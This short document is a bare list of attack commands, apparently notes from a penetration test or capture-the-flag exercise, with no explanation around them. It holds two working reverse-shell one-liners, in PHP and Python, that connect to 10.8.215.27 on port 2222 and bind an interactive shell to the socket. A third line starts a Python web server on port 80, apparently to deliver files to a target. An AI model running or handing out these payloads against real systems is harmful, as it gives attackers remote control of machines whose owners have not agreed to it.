php -r '$sock=fsockopen("10.8.215.27",2222);exec("/bin/bash -i <&3 >&3 2>&3");'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.215.27",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -m http.server 80